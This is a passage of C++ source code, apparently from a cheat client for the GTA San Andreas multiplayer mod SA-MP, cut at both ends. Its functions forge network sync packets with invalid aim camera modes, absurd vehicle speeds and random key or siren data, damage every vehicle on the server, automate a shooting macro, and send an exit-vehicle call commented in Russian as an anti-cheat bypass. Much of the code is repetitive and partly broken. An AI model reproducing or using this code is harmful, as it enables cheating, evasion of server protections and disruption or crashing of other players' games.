			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
//////////////////////////////////////////////////////////////////////////////////////////////////


			stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
			
			
			onSync.fTrainSpeed = (float)0xDDDDDDDDDDF0BDC1;
			
			
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			time = GetTickCount();
			}
			static int timecc = 0;
			if (GetTickCount() - 4000 > timecc)
			{
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			 BitStream bStream;
			bStream.Write(g_Players->pLocalPlayer->sCurrentVehicleID);                                        //---------> долгожданный ебучий обход защиты
			g_DrifeitClient->RPC(RPC_ExitVehicle, &bStream, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 99;
			timecc = GetTickCount();
			}
			
		}
	}


  void cheat_handle_pickmaasssssswqzzq141aa()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas8 == 1 )  
  { 
	  
		stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;  
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
			static float angle = 0.0f;


		float speed_vect_len = 0.5f;

		onSync.fMoveSpeed[0] = sin(angle) * speed_vect_len;
		onSync.fMoveSpeed[1] = cos(angle) * speed_vect_len;

		

		//angle += M_PI/18;


		if (angle > 2 * M_PI)
			angle -= 2 * M_PI;

			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	
  }}


 void cheat_handle_pickmaasssssswqzzq141a()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas7 == 1 )  
  { 
	struct vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);

	static bool fireveh = false;

		static int state = 0;
		static DWORD Time = 0;

		if ( !fireveh )
		{
			
			fireveh = 1;
		}

		if(!g_SAMP)
			return;

			if(!vinfo)
				return;

			vinfo->hitpoints = 200;

			if (GetTickCount() - 200 > Time)
			{
			   vinfo->hitpoints = 1000;
			   Time = GetTickCount();
			}	
		
	
	else
	{
		if ( fireveh )
		{
			
			fireveh = 0;		
			 
		
			
		}}}}






 void cheat_handle_pickmaasssssswqzzq1411()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas6 == 1 )  
  { 
			
			static bool auto_c_m = false;
	

		if(!auto_c_m)
		{
		
			auto_c_m = true;
		}

		actor_info *me = actor_info_get(ACTOR_SELF, NULL);
		if (!me)
			return;


		if (!gta_menu_active() && !cheat_state->_generic.menu && me->state != ACTOR_STATE_DRIVING)
		{


			enum eStep
			{
				C_BUG_STEP_SHOT,
				C_BUG_STEP_SHOT_UP,
				C_BUG_STEP_PRESS_C,
				C_BUG_STEP_C_UP,
				C_BUG_STEP_AIMING,
			};


			static DWORD step = C_BUG_STEP_SHOT;


			
			

			int now_rkey_down = (bool)(GetKeyState(VK_RBUTTON) & 0x8000);
			int now_lkey_down = (bool)(GetKeyState(VK_LBUTTON) & 0x8000);
			static int most_rkey_down = true;
			static int most_lkey_down = true;
			bool shooting = false;


			//blue_eclipse_text("%i %i %i %i", now_rkey_down, now_lkey_down, most_rkey_down, most_lkey_down);

			if (((now_lkey_down && most_lkey_down) || !most_lkey_down) && 
				((now_rkey_down && most_rkey_down) || !most_rkey_down))
			{
				shooting = true;
			}
			else
			{
				shooting = false;
				if (!most_rkey_down)
				{
					mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
					most_rkey_down = true;
				}

				if (!most_lkey_down)
				{
					mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
					most_lkey_down = true;
				}

				step = C_BUG_STEP_SHOT;
			}
			

			if (shooting)
			{
				static DWORD timeout;
				static DWORD tick;

				DWORD now_tick = GetTickCount();


				if (now_tick - tick > timeout)
				{

					tick = now_tick;


					switch (step)
					{
					case C_BUG_STEP_SHOT:
						most_lkey_down = true;
						//blue_eclipse_text("%i", now_lkey_down);
						if (now_lkey_down)
							mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
						timeout = 0;
						//blue_eclipse_text("shoting...");
						break;
					case C_BUG_STEP_SHOT_UP:
						most_rkey_down = false;
						most_lkey_down = false;
						mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
						mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
						
						timeout = 10;
						//blue_eclipse_text("shot up...");
						break;
					case C_BUG_STEP_PRESS_C:
						timeout = 10;
						keybd_event(KEY_C, 0, 0, 0);
						//blue_eclipse_text("press c...");
						break;
					case C_BUG_STEP_C_UP:
						keybd_event(KEY_C, 0, KEYEVENTF_KEYUP, 0);
						//blue_eclipse_text("c up...");
						break;
					case C_BUG_STEP_AIMING:
						
						//blue_eclipse_text("%i", GetKeyState(VK_RBUTTON));
						mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
						most_rkey_down = true;
						timeout = 10;

						
						//blue_eclipse_text("aiming...");
						break;
					default:
						break;
					}



					if (step++ >= C_BUG_STEP_AIMING)
						step = C_BUG_STEP_SHOT;
				}
			}
		
			

	}
	else
	{
		if(auto_c_m)
		{
		
			auto_c_m = false;
			
		}}}}


 void cheat_handle_pickmaasssssswqzzq141()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas5 == 1 )  
  { 
			
			 stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData)); 
			

			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			BYTE bNums[] = {34, 45}; // Invalid byteCamMode IDs
			aimSync.byteCamMode = bNums[random(0, sizeof(bNums))];
			aimSync.byteWeaponState = WS_MORE_BULLETS;

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync,sizeof(stAimData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);

			////////////////////////////////////////////
			
			
			
			//struct actor_info	*self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
			//self->weapon[self->weapon_slot].id = 26;
			//self->weapon[self->weapon_slot].ammo = 1000;
		
			
}}


 void cheat_handle_pickmaasssssswqzzq14()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas4 == 1 )  
  { 
			
			 stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData)); 
			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			aimSync.vecAimPos[2] = pow(10.f + random_float(0, 1), random_float(6, 9))*(int)random(-1, 1) * 3;
			aimSync.byteCamMode = 53;
			aimSync.byteWeaponState = WS_MORE_BULLETS;

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync,sizeof(stAimData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);

			////////////////////////////////////////////
			
			
			
			//struct actor_info	*self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
			//self->weapon[self->weapon_slot].id = 26;
			//self->weapon[self->weapon_slot].ammo = 1000;
		
			
}}
 // != 95611036

 void cheat_handle_pickmaasssssswqzzq14l()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas4l == 1 )  
  { 
	 
	  stInCarData onSync;
	  ZeroMemory(&onSync, sizeof(stInCarData));

	  onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
	  onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth;
	  onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
	  onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;

	  onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
	  onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
	  onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];

	  onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
	  onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
	  onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];


	  onSync.byteSiren = rand() % 4; 
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4; 
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  onSync.byteSiren = rand() % 4;
	  ///onSync.byteLandingGearState = (float)0xFFFFFFFFFFF0BDC1;

	   BitStream bsData;
	  bsData.Write((BYTE)ID_VEHICLE_SYNC);
	  bsData.Write((PCHAR)&onSync, sizeof(stInCarData));
	 
	  g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	  
}}

 static int action = 1, timeh = 0;
 int typea = 0;
 void cheat_handle_pickmaasssssswqzzq14l1()
 {
	 traceLastFunc("cheat_handle_pickmaa()");
	 if (cheat_state->_generic.asasasas4l1 == 1)
	 {
		 static DWORD timeh = GetTickCount();
		 if (GetTickCount() - 300 > timeh)
		 {
			 //struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
			 for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			 {
				 if (g_Vehicles->iIsListed[v] != 1)
					 continue;
				 if (g_Vehicles->pSAMP_Vehicle[v] == NULL)
					 continue;
				 if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL)
					 continue;
				 int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				 struct vehicle_info *info = vehicle_info_get(car_id, 0);
				 stInCarData sync;
				  BitStream bsVehicleSync;
				 memset(&sync, 0, sizeof(stInCarData));
				 sync.sVehicleID = v;
				 sync.fVehicleHealth = info->hitpoints;
				 sync.fMoveSpeed[0] = info->speed[0];
				 sync.fMoveSpeed[1] = info->speed[1];
				 sync.fMoveSpeed[2] = info->speed[2];
				 //sync.bytePlayerHealth = self->hitpoints;
				 //sync.byteCurrentWeapon = self->armor;
				 vect3_copy(&info->base.matrix[12], sync.fPosition);
				 bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				 bsVehicleSync.Write((PCHAR)&sync, sizeof(stInCarData));
				 g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
				 

				 bool vehPanelStatus1 = rand() % 999999999999999999 + 4;
				 vehPanelStatus1 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus1 = rand() % 999999999999999999 + 4;
				 vehDoorStatus1 = rand() % -999999999999999999 - 4;
				 int vehLightStatus1 = rand() % 999999999999999999 + 4;
				 vehLightStatus1 = rand() % 999999999999999999 - 4;
				 int vehTireStatus1 = rand() % 999999999999999999 + 4;
				 vehTireStatus1 = rand() % 999999999999999999 - 4;
				 int vehTireTest1 = rand() % 999999999999999999 + 4;
				 vehTireTest1 = rand() % 999999999999999999 - 4;
				 int vehTireTests1 = rand() % 999999999999999999 + 4;
				 vehTireTest1 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus1, vehDoorStatus1, vehLightStatus1, vehTireStatus1, vehTireTest1, vehTireTests1);

				 bool vehPanelStatus = rand() % 999999999999999999 + 4;
				 vehPanelStatus = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus = rand() % 999999999999999999 + 4;
				 vehDoorStatus = rand() % -999999999999999999 - 4;
				 int vehLightStatus = rand() % 999999999999999999 + 4;
				 vehLightStatus = rand() % 999999999999999999 - 4;
				 int vehTireStatus = rand() % 999999999999999999 + 4;
				 vehTireStatus = rand() % 999999999999999999 - 4;
				 int vehTireTest = rand() % 999999999999999999 + 4;
				 vehTireTest = rand() % 999999999999999999 - 4;
				 int vehTireTests = rand() % 999999999999999999 + 4;
				 vehTireTest = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus, vehDoorStatus, vehLightStatus, vehTireStatus, vehTireTest, vehTireTests);

				 bool vehPanelStatus3 = rand() % 999999999999999999 + 4;
				 vehPanelStatus3 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus3 = rand() % 999999999999999999 + 4;
				 vehDoorStatus3 = rand() % -999999999999999999 - 4;
				 int vehLightStatus3 = rand() % 999999999999999999 + 4;
				 vehLightStatus3 = rand() % 999999999999999999 - 4;
				 int vehTireStatus3 = rand() % 999999999999999999 + 4;
				 vehTireStatus3 = rand() % 999999999999999999 - 4;
				 int vehTireTest3 = rand() % 999999999999999999 + 4;
				 vehTireTest3 = rand() % 999999999999999999 - 4;
				 int vehTireTests3 = rand() % 999999999999999999 + 4;
				 vehTireTest3 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus3, vehDoorStatus3, vehLightStatus3, vehTireStatus3, vehTireTest3, vehTireTests3);

				 bool vehPanelStatus2 = rand() % 999999999999999999 + 4;
				 vehPanelStatus2 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus2 = rand() % 999999999999999999 + 4;
				 vehDoorStatus2 = rand() % -999999999999999999 - 4;
				 int vehLightStatus2 = rand() % 999999999999999999 + 4;
				 vehLightStatus2 = rand() % 999999999999999999 - 4;
				 int vehTireStatus2 = rand() % 999999999999999999 + 4;
				 vehTireStatus2 = rand() % 999999999999999999 - 4;
				 int vehTireTest2 = rand() % 999999999999999999 + 4;
				 vehTireTest2 = rand() % 999999999999999999 - 4;
				 int vehTireTests2 = rand() % 999999999999999999 + 4;
				 vehTireTest2 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus2, vehDoorStatus2, vehLightStatus2, vehTireStatus2, vehTireTest2, vehTireTests2);

				 bool vehPanelStatus6 = rand() % 999999999999999999 + 4;
				 vehPanelStatus6 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus6 = rand() % 999999999999999999 + 4;
				 vehDoorStatus6 = rand() % -999999999999999999 - 4;
				 int vehLightStatus6 = rand() % 999999999999999999 + 4;
				 vehLightStatus6 = rand() % 999999999999999999 - 4;
				 int vehTireStatus6 = rand() % 999999999999999999 + 4;
				 vehTireStatus6 = rand() % 999999999999999999 - 4;
				 int vehTireTest6 = rand() % 999999999999999999 + 4;
				 vehTireTest6 = rand() % 999999999999999999 - 4;
				 int vehTireTests6 = rand() % 999999999999999999 + 4;
				 vehTireTest6 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus6, vehDoorStatus6, vehLightStatus6, vehTireStatus6, vehTireTest6, vehTireTests6);

				 bool vehPanelStatus5 = rand() % 999999999999999999 + 4;
				 vehPanelStatus5 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus5 = rand() % 999999999999999999 + 4;
				 vehDoorStatus5 = rand() % -999999999999999999 - 4;
				 int vehLightStatus5 = rand() % 999999999999999999 + 4;
				 vehLightStatus5 = rand() % 999999999999999999 - 4;
				 int vehTireStatus5 = rand() % 999999999999999999 + 4;
				 vehTireStatus5 = rand() % 999999999999999999 - 4;
				 int vehTireTest5 = rand() % 999999999999999999 + 4;
				 vehTireTest5 = rand() % 999999999999999999 - 4;
				 int vehTireTests5 = rand() % 999999999999999999 + 4;
				 vehTireTest5 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus5, vehDoorStatus5, vehLightStatus5, vehTireStatus5, vehTireTest5, vehTireTests5);

				 bool vehPanelStatus4 = rand() % 999999999999999999 + 4;
				 vehPanelStatus4 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus4 = rand() % 999999999999999999 + 4;
				 vehDoorStatus4 = rand() % -999999999999999999 - 4;
				 int vehLightStatus4 = rand() % 999999999999999999 + 4;
				 vehLightStatus4 = rand() % 999999999999999999 - 4;
				 int vehTireStatus4 = rand() % 999999999999999999 + 4;
				 vehTireStatus4 = rand() % 999999999999999999 - 4;
				 int vehTireTest4 = rand() % 999999999999999999 + 4;
				 vehTireTest4 = rand() % 999999999999999999 - 4;
				 int vehTireTests4 = rand() % 999999999999999999 + 4;
				 vehTireTest4 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus4, vehDoorStatus4, vehLightStatus4, vehTireStatus4, vehTireTest4, vehTireTests4);

				 bool vehPanelStatusq = rand() % 999999999999999999 + 4;
				 vehPanelStatusq = rand() % -999999999999999999 - 4;
				 bool vehDoorStatusq = rand() % 999999999999999999 + 4;
				 vehDoorStatusq = rand() % -999999999999999999 - 4;
				 int vehLightStatusq = rand() % 999999999999999999 + 4;
				 vehLightStatusq = rand() % 999999999999999999 - 4;
				 int vehTireStatusq = rand() % 999999999999999999 + 4;
				 vehTireStatusq = rand() % 999999999999999999 - 4;
				 int vehTireTestq = rand() % 999999999999999999 + 4;
				 vehTireTestq = rand() % 999999999999999999 - 4;
				 int vehTireTestsq = rand() % 999999999999999999 + 4;
				 vehTireTestq = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatusq, vehDoorStatusq, vehLightStatusq, vehTireStatusq, vehTireTestq, vehTireTestsq);

				 bool vehPanelStatus0 = rand() % 999999999999999999 + 4;
				 vehPanelStatus0 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus0 = rand() % 999999999999999999 + 4;
				 vehDoorStatus0 = rand() % -999999999999999999 - 4;
				 int vehLightStatus0 = rand() % 999999999999999999 + 4;
				 vehLightStatus0 = rand() % 999999999999999999 - 4;
				 int vehTireStatus0 = rand() % 999999999999999999 + 4;
				 vehTireStatus0 = rand() % 999999999999999999 - 4;
				 int vehTireTest0 = rand() % 999999999999999999 + 4;
				 vehTireTest0 = rand() % 999999999999999999 - 4;
				 int vehTireTests0 = rand() % 999999999999999999 + 4;
				 vehTireTest0 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus0, vehDoorStatus0, vehLightStatus0, vehTireStatus0, vehTireTest0, vehTireTests0);

				 bool vehPanelStatus9 = rand() % 999999999999999999 + 4;
				 vehPanelStatus9 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus9 = rand() % 999999999999999999 + 4;
				 vehDoorStatus9 = rand() % -999999999999999999 - 4;
				 int vehLightStatus9 = rand() % 999999999999999999 + 4;
				 vehLightStatus9 = rand() % 999999999999999999 - 4;
				 int vehTireStatus9 = rand() % 999999999999999999 + 4;
				 vehTireStatus9 = rand() % 999999999999999999 - 4;
				 int vehTireTest9 = rand() % 999999999999999999 + 4;
				 vehTireTest9 = rand() % 999999999999999999 - 4;
				 int vehTireTests9 = rand() % 999999999999999999 + 4;
				 vehTireTest9 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus9, vehDoorStatus9, vehLightStatus9, vehTireStatus9, vehTireTest9, vehTireTests9);

				 bool vehPanelStatus8 = rand() % 999999999999999999 + 4;
				 vehPanelStatus8 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus8 = rand() % 999999999999999999 + 4;
				 vehDoorStatus8 = rand() % -999999999999999999 - 4;
				 int vehLightStatus8 = rand() % 999999999999999999 + 4;
				 vehLightStatus8 = rand() % 999999999999999999 - 4;
				 int vehTireStatus8 = rand() % 999999999999999999 + 4;
				 vehTireStatus8 = rand() % 999999999999999999 - 4;
				 int vehTireTest8 = rand() % 999999999999999999 + 4;
				 vehTireTest8 = rand() % 999999999999999999 - 4;
				 int vehTireTests8 = rand() % 999999999999999999 + 4;
				 vehTireTest8 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus8, vehDoorStatus8, vehLightStatus8, vehTireStatus8, vehTireTest8, vehTireTests8);

				 bool vehPanelStatus7 = rand() % 999999999999999999 + 4;
				 vehPanelStatus7 = rand() % -999999999999999999 - 4;
				 bool vehDoorStatus7 = rand() % 999999999999999999 + 4;
				 vehDoorStatus7 = rand() % -999999999999999999 - 4;
				 int vehLightStatus7 = rand() % 999999999999999999 + 4;
				 vehLightStatus7 = rand() % 999999999999999999 - 4;
				 int vehTireStatus7 = rand() % 999999999999999999 + 4;
				 vehTireStatus7 = rand() % 999999999999999999 - 4;
				 int vehTireTest7 = rand() % 999999999999999999 + 4;
				 vehTireTest7 = rand() % 999999999999999999 - 4;
				 int vehTireTests7 = rand() % 999999999999999999 + 4;
				 vehTireTest7 = rand() % 999999999999999999 - 4;
				 DamageVehicle(v, vehPanelStatus7, vehDoorStatus7, vehLightStatus7, vehTireStatus7, vehTireTest7, vehTireTests7);
				 timeh = GetTickCount();
			 }
		 }

	 }
 }
 

 void cheat_handle_pickmaasssssswqzzq14l2()
 {
	 traceLastFunc("cheat_handle_pickmaa()");
	 if (cheat_state->_generic.asasasas4l2 == 1)
	 {
		 stInCarData onSync;
		 ZeroMemory(&onSync, sizeof(stInCarData));

		 onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
		 onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth;
		 onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
		 onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;

		 onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
		 onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
		 onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];

		 onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
		 onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
		 onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];

		 onSync.sUpDownKeys = rand() % 10;
		 onSync.sLeftRightKeys = rand() % 10;
		 onSync.sKeys = rand() % 10;

		 
		  BitStream bsData;
		 bsData.Write((BYTE)ID_VEHICLE_SYNC);
		 bsData.Write((PCHAR)&onSync, sizeof(stInCarData));
		 //for (int i = 0; i < 2; i++)
		 g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
		

	 }
 }

 


 
 


 void cheat_handle_pickmaasssssswqzzq1()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas3 == 1 )  
  { 
			stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
